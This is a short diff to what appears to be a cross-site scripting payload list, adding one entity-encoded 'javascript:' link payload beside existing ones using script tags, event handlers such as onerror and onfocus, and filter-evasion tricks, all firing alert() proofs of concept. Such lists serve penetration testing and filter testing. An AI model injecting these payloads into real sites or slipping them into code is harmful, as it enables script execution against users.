@@ -84,6 +84,7 @@ javascript://%250Aalert(1)//?0
 /alert(1)//\
 <div onpointerover="alert(1)">tikla</div>
 "autofocus onfocus=alert(1)//
+#"></div><a href= javascript&colon;alert&lpar;document&period;domain)
 --><script>alert(1)</script>
 <!----><script>alert(1)</script>-->
 \74img/src/onerror=alert(1)\76
